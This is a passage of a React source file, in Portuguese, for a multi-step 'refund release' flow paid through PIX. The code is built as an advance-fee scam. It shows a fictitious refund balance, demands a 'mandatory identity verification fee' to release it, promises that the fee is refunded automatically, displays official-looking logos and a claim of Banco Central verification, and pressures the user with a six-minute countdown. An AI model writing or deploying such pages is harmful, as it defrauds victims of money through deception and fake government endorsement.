                    <h2 className="font-display text-white font-bold text-sm leading-tight">Solicitar Reembolso</h2>
                    <p className="text-[#00FF66] text-xs leading-tight">Última etapa</p>
                </div>
            </div>

            <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3 flex flex-col gap-3">

                {/* Chave PIX confirmada */}
                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <p className="text-[10px] font-bold tracking-[0.15em] text-zinc-500 uppercase mb-2">CHAVE PIX CADASTRADA</p>
                    <div className="flex items-center justify-between gap-3">
                        <span className="text-zinc-400 text-sm flex-shrink-0">{pixKeyData?.keyType}</span>
                        <span className="text-white text-sm font-semibold truncate text-right">{pixKeyData?.keyValue}</span>
                    </div>
                </div>

                {/* Valor do reembolso com animação crescente */}
                <div className="rounded-2xl p-4 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <p className="text-[10px] font-bold tracking-[0.15em] text-zinc-500 uppercase mb-2">REEMBOLSO DISPONÍVEL</p>
                    <div className="w-full rounded-xl py-3 px-5 mb-2" style={{ backgroundColor: "#00FF66" }}>
                        <span className="font-bold text-2xl text-black font-mono tabular-nums">
                            R$ {countedVal}
                        </span>
                    </div>
                    <p className="text-[#00FF66] text-[11px] font-semibold">✓ Transferência via PIX após liberação</p>
                </div>

                {/* Progress etapas — estética da página */}
                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <p className="text-[11px] text-zinc-300 text-center leading-relaxed mb-4">
                        Conclua o processo de verificação de identidade<br />
                        <span className="text-zinc-500">exigido pelos órgãos oficiais!</span>
                    </p>
                    <div className="flex items-start justify-center gap-3 mb-4">
                        {/* Etapa 1 */}
                        <div className="flex flex-col items-center gap-1.5">
                            <div className="w-11 h-11 rounded-full bg-[#00FF66] flex items-center justify-center shadow-[0_0_16px_rgba(0,255,102,0.4)]">
                                {CHECK}
                            </div>
                            <span className="text-[10px] text-[#00FF66] font-semibold text-center leading-tight">Etapa 1<br/>Concluída</span>
                        </div>
                        {/* Linha de conexão */}
                        <div className="flex-1 max-w-[60px] h-px mt-5" style={{ background: "linear-gradient(to right,#00FF66,#1e3a26)" }} />
                        {/* Etapa 2 */}
                        <div className="flex flex-col items-center gap-1.5">
                            <div className="w-11 h-11 rounded-full border-2 border-[#facc15] flex items-center justify-center" style={{ backgroundColor: "#1a1a0a" }}>
                                <span className="text-[#facc15] font-bold text-base">2</span>
                            </div>
                            <span className="text-[10px] text-[#facc15] font-semibold text-center leading-tight">Etapa 2<br/>Pendente</span>
                        </div>
                    </div>
                    {/* Logos oficiais */}
                    <div className="flex justify-center pt-3 border-t border-zinc-800/60">
                        <LogosOficiais />
                    </div>
                </div>

                {/* Validação de identidade — bloco complementar */}
                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1a10", border: "1px solid rgba(250,204,21,0.25)" }}>
                    <div className="flex items-center gap-2 mb-3">
                        <span className="text-base">🛡️</span>
                        <p className="text-white text-xs font-bold">Validação de identidade e Segurança</p>
                    </div>
                    <div className="flex items-center justify-between mb-3">
                        <p className="text-[#00FF66] font-bold text-xl">{TAXA_DISPLAY}</p>
                        <span className="text-[9px] bg-yellow-900/40 text-yellow-400 px-2 py-1 rounded-full border border-yellow-700/40 font-semibold">
                            ⏳ Verificação pendente
                        </span>
                    </div>
                    <p className="text-zinc-400 text-[11px] leading-relaxed mb-3">
                        Essa etapa exige o pagamento de uma{" "}
                        <span className="text-white font-semibold">tarifa única e obrigatória de confirmação</span>, no valor de{" "}
                        <span className="text-white font-semibold">{TAXA_DISPLAY}</span>, utilizada exclusivamente para validar seus dados e confirmar que a solicitação de saque está sendo realizada por uma pessoa real e garantir a liberação segura do seu saldo!
                    </p>
                    <div className="rounded-xl p-3" style={{ backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" }}>
                        <p className="text-[11px] text-zinc-300 leading-relaxed">
                            <span className="text-[#00FF66] font-semibold">Importante:</span> O valor da tarifa será reembolsado automaticamente em instantes e sua transferência de{" "}
                            <span className="text-white font-semibold">R$ {amounts?.total}</span> será transferida via PIX em sua conta verificada de destino!
                        </p>
                    </div>
                </div>

                {/* Processo de Saque — 3 etapas */}
                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <div className="flex items-center gap-2 mb-4">
                        <div className="w-5 h-5 rounded-full bg-[#00FF66] flex items-center justify-center flex-shrink-0">
                            {CHECK}
                        </div>
                        <p className="text-white font-bold text-xs tracking-wider uppercase">Processo de Saque</p>
                    </div>

                    {[
                        {
                            state: "done",
                            title: "Validação da chave PIX e conta de destino para saque",
                            desc: `Conseguimos validar com sucesso sua chave PIX e conta de destino de saque no valor de R$ ${amounts?.total}. Lhe enviaremos uma pequena transferência teste via PIX ✅`,
                        },
                        {
                            state: "pending",
                            title: "Verificação Obrigatória de Identidade",
                            desc: `Pagamento da pequena tarifa de ${TAXA_DISPLAY} para validação de identidade e protocolo de segurança do titular.`,
                        },
                        {
                            state: "locked",
                            title: "Reembolso da tarifa e saque instantâneo do seu saldo",
                            desc: `Receba o reembolso integral do valor pago — ${TAXA_DISPLAY}. Liberação do seu saldo e transferência imediata via PIX — R$ ${amounts?.total}.`,
                        },
                    ].map(({ state, title, desc }, i) => (
                        <div key={i} className="flex gap-3">
                            <div className="flex flex-col items-center flex-shrink-0">
                                {state === "done" && (
                                    <div className="w-7 h-7 rounded-full bg-[#00FF66] flex items-center justify-center shadow-[0_0_8px_rgba(0,255,102,0.4)]">
                                        {CHECK}
                                    </div>
                                )}
                                {state === "pending" && (
                                    <div className="w-7 h-7 rounded-full border-2 border-[#facc15] flex items-center justify-center" style={{ backgroundColor: "#1a1a0a" }}>
                                        <span className="text-[#facc15] font-bold text-xs">{i + 1}</span>
                                    </div>
                                )}
                                {state === "locked" && (
                                    <div className="w-7 h-7 rounded-full border border-zinc-700 flex items-center justify-center" style={{ backgroundColor: "#111d15" }}>
                                        <span className="text-zinc-500 font-bold text-xs">{i + 1}</span>
                                    </div>
                                )}
                                {i < 2 && (
                                    <div className="w-px mt-1 mb-0" style={{ height: "32px", backgroundColor: i === 0 ? "#00FF66" : "#1e3a26" }} />
                                )}
                            </div>
                            <div className="flex-1 pb-4">
                                <p className={`text-xs font-bold mb-1 ${state === "done" ? "text-[#00FF66]" : state === "pending" ? "text-[#facc15]" : "text-zinc-500"}`}>
                                    {title}
                                </p>
                                <p className="text-zinc-400 text-[11px] leading-relaxed">{desc}</p>
                            </div>
                        </div>
                    ))}
                </div>

                {error && <p className="text-red-400 text-xs text-center">{error}</p>}

                <button
                    onClick={handlePay}
                    disabled={loading}
                    className="w-full py-4 rounded-2xl font-bold text-black text-sm tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98] disabled:opacity-60 shadow-[0_0_24px_rgba(0,255,102,0.3)]"
                    style={{ backgroundColor: "#00FF66" }}
                >
                    {loading ? "⏳ Gerando PIX..." : `Pagar taxa para Liberar Saque`}
                </button>

                <p className="text-center text-[11px] text-[#00FF66] font-semibold -mt-1">
                    ✓ Reembolso automático em 1 minuto
                </p>

                <div className="flex justify-center">
                    <LogosOficiais />
                </div>
                <p className="text-center text-zinc-600 text-[9px] -mt-2 mb-1">Processo 100% seguro</p>

            </div>

            <BottomNav activeIndex={3} />
        </ModalCard>
    );
}

// ─── step 6: payment ──────────────────────────────────────────────────────────

function StepPayment({ paymentData, onComplete }) {
    const [copied, setCopied]     = useState(false);
    const [expired, setExpired]   = useState(false);
    const [timeLeft, setTimeLeft] = useState(6 * 60); // 6 min
    const onCompleteRef           = useRef(onComplete);
    useEffect(() => { onCompleteRef.current = onComplete; });

    // Countdown do timer
    useEffect(() => {
        const interval = setInterval(() => {
            setTimeLeft((prev) => {
                if (prev <= 1) { clearInterval(interval); setExpired(true); return 0; }
                return prev - 1;
            });
        }, 1000);
        return () => clearInterval(interval);
    }, []);

    // Polling de status
    useEffect(() => {
        const txId = paymentData.transactionId;
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`/api/pix/status?transactionId=${encodeURIComponent(txId)}`);
                if (!res.ok) return;
                const { status } = await res.json();
                if (status === "COMPLETED") { clearInterval(interval); onCompleteRef.current(); }
            } catch { /* retry */ }
        }, 5000);
        const timeout = setTimeout(() => { clearInterval(interval); setExpired(true); }, 6 * 60 * 1000);
        return () => { clearInterval(interval); clearTimeout(timeout); };
    }, [paymentData.transactionId]);

    const fallbackCopy = (text) => {
        const ta = document.createElement("textarea");
        ta.value = text;
        ta.style.cssText = "position:fixed;opacity:0;top:0;left:0;pointer-events:none";
        document.body.appendChild(ta);
        ta.focus(); ta.select();
        try { document.execCommand("copy"); } catch {}
        document.body.removeChild(ta);
    };

    const copyCode = () => {
        const code = paymentData.pixCode;
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(code).catch(() => fallbackCopy(code));
        } else {
            fallbackCopy(code);
        }
        setCopied(true);
        setTimeout(() => setCopied(false), 2500);
    };

    const mins = Math.floor(timeLeft / 60).toString().padStart(2, "0");
    const secs = (timeLeft % 60).toString().padStart(2, "0");
    const timerColor = timeLeft > 180 ? "#00FF66" : timeLeft > 60 ? "#facc15" : "#f87171";
    const urgent = timeLeft <= 60;

    if (expired) {
        return (
            <ModalCard>
                <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
                    <p className="text-4xl mb-3">⏰</p>
                    <p className="text-white font-bold text-lg mb-2">PIX Expirado</p>
                    <p className="text-zinc-400 text-sm">O tempo de pagamento expirou. Por favor, reinicie o processo.</p>
                </div>
                <BottomNav activeIndex={3} />
            </ModalCard>
        );
    }

    return (
        <ModalCard>
            <div className="flex-shrink-0 px-4 py-3 border-b border-zinc-800 text-center">
                <h2 className="font-display text-white font-bold text-sm leading-tight">Pagar com PIX</h2>
                <p className="text-[#00FF66] text-xs leading-tight">Escaneie o QR Code ou copie o código</p>
            </div>

            <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3">
                {/* Valor */}
                <div className="text-center mb-3">
                    <p className="text-zinc-500 text-xs mb-0.5">Taxa de Liberação de Reembolso</p>
                    <p className="text-[#00FF66] font-display font-bold text-3xl">{TAXA_DISPLAY}</p>
                </div>

                {/* Timer */}
                <div
                    className="rounded-2xl py-4 px-5 mb-3 flex flex-col items-center"
                    style={{ backgroundColor: "#0d1f12", border: `1px solid ${timerColor}40` }}
                >
                    <p className="text-[10px] font-semibold tracking-[0.18em] text-zinc-500 uppercase mb-1">
                        PIX válido por
                    </p>
                    <span
                        className={`font-mono font-bold text-3xl tabular-nums leading-none ${urgent ? "animate-pulse" : ""}`}
                        style={{ color: timerColor, textShadow: `0 0 24px ${timerColor}70` }}
                    >
                        {mins}:{secs}
                    </span>
                    <p
                        className="text-xs font-semibold mt-2 text-center"
                        style={{ color: urgent ? "#f87171" : "#facc15" }}
                    >
                        Recupere agora seus reembolsos antes que expirem!
                    </p>
                </div>

                {/* QR Code */}
                <div className="flex justify-center mb-3">
                    <div className="p-4 bg-white rounded-2xl shadow-[0_0_32px_rgba(0,255,102,0.15)]">
                        <QRCodeSVG value={paymentData.pixCode} size={176} level="M" />
                    </div>
                </div>

                {/* Copy button */}
                <button
                    onClick={copyCode}
                    className="w-full py-3.5 rounded-xl border text-sm font-semibold flex items-center justify-center gap-2 transition-all duration-200 mb-3 active:scale-[0.98]"
                    style={{
                        backgroundColor: copied ? "rgba(0,255,102,0.12)" : "#0d1f12",
                        borderColor: copied ? "#00FF66" : "#2d4a35",
                        color: copied ? "#00FF66" : "#d4d4d8",
                    }}
                >
                    {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    {copied ? "✓ Código copiado com sucesso!" : "Copiar código PIX"}
                </button>

                {/* Status polling */}
                <div className="rounded-xl p-3 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <div className="flex items-center justify-center gap-2 text-xs text-zinc-400">
                        <span className="w-2 h-2 rounded-full bg-[#00FF66] animate-pulse flex-shrink-0" />
                        Aguardando confirmação do pagamento...
                    </div>
                    <p className="text-zinc-600 text-[10px] mt-1">Atualiza automaticamente a cada 5 segundos</p>
                </div>
            </div>

            <BottomNav activeIndex={3} />
        </ModalCard>
    );
}

// ─── step 7: confirmed ────────────────────────────────────────────────────────

function StepConfirmed({ onClose }) {
    return (
        <ModalCard>
            <div className="flex-1 overflow-y-auto px-5 py-8">
                <div className="flex flex-col items-center text-center">
                    <div className="w-20 h-20 rounded-full bg-[#00FF66] flex items-center justify-center mb-5 shadow-[0_0_40px_rgba(0,255,102,0.4)]">
                        <svg className="w-10 h-10 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h2 className="font-display text-white text-2xl font-bold mb-2">Pagamento Confirmado!</h2>
                    <p className="text-zinc-400 text-sm leading-relaxed mb-6">
                        Sua taxa de liberação foi recebida. O reembolso será processado e enviado para a sua chave PIX em até 24 horas.
                    </p>

                    {[
                        { icon: "📧", text: "Você receberá um e-mail de confirmação" },
                        { icon: "⏱", text: "Prazo de até 24h para receber o valor na sua chave PIX" },
                        { icon: "🔒", text: "Transação segura e verificada pelo Banco Central" },
                    ].map(({ icon, text }) => (
                        <div key={text} className="flex items-center gap-3 w-full mb-2 p-3 rounded-xl" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                            <span className="text-lg flex-shrink-0">{icon}</span>
                            <p className="text-zinc-300 text-xs text-left">{text}</p>
                        </div>
                    ))}

                    <button
                        onClick={onClose}
                        className="mt-6 w-full py-4 rounded-2xl font-bold text-black text-sm transition-all duration-200 hover:brightness-110"
                        style={{ backgroundColor: "#00FF66" }}
                    >
                        FECHAR
                    </button>
                </div>
            </div>
            <BottomNav activeIndex={0} />
        </ModalCard>
    );
}

// ─── main export ──────────────────────────────────────────────────────────────

export default function ConsultaFlow({ open, onClose, initialFormData = null }) {
    const [step, setStep]               = useState("form");
    const [formData, setFormData]       = useState(null);
    const [pixKeyData, setPixKeyData]   = useState(null);
    const [paymentData, setPaymentData] = useState(null);

    // Quando abre: se veio com dados do gate, pula direto para loading
    useEffect(() => {
        if (open) {
            if (initialFormData) {
                setFormData({
                    ...initialFormData,
                    amounts: initialFormData.amounts || generateAmounts(initialFormData.valorDigits),
                });
                setStep("pix-key");
            }
        } else {
            const timer = setTimeout(() => {
                setStep(initialFormData ? "pix-key" : "form");
                setFormData(null);
                setPixKeyData(null);
                setPaymentData(null);
            }, 300);
            return () => clearTimeout(timer);
        }
    }, [open]); // eslint-disable-line react-hooks/exhaustive-deps

    useEffect(() => {
        document.body.style.overflow = open ? "hidden" : "";
        return () => { document.body.style.overflow = ""; };
    }, [open]);

    if (!open) return null;

    const backFromPixKey = initialFormData ? onClose : () => setStep("results");

    return (
        <>
            {step === "form" && !initialFormData && (
                <StepForm
                    onClose={onClose}
                    onSubmit={(data) => { setFormData({ ...data, amounts: generateAmounts(data.valorDigits) }); setStep("loading"); }}
                />
            )}
            {step === "loading" && (
                <StepLoading onComplete={() => setStep("results")} />
            )}
            {step === "results" && formData && (
                <StepResults
                    formData={formData}
                    onClose={onClose}
                    onRegisterPix={() => setStep("pix-key")}
                />
            )}
            {step === "pix-key" && formData && (
                <StepPixKey
                    formData={formData}
                    onBack={backFromPixKey}
                    onSubmit={(data) => { setPixKeyData(data); setStep("taxa"); }}
                />
            )}
            {step === "taxa" && formData && pixKeyData && (
                <StepTaxa
                    formData={formData}
                    pixKeyData={pixKeyData}
                    onBack={() => setStep("pix-key")}
                    onPay={(data) => { setPaymentData(data); setStep("payment"); }}
                />
            )}
            {step === "payment" && paymentData && (
                <StepPayment
                    paymentData={paymentData}
                    onComplete={() => setStep("confirmed")}
                />
            )}
            {step === "confirmed" && (
                <StepConfirmed onClose={onClose} />
            )}
        </>
    );
}
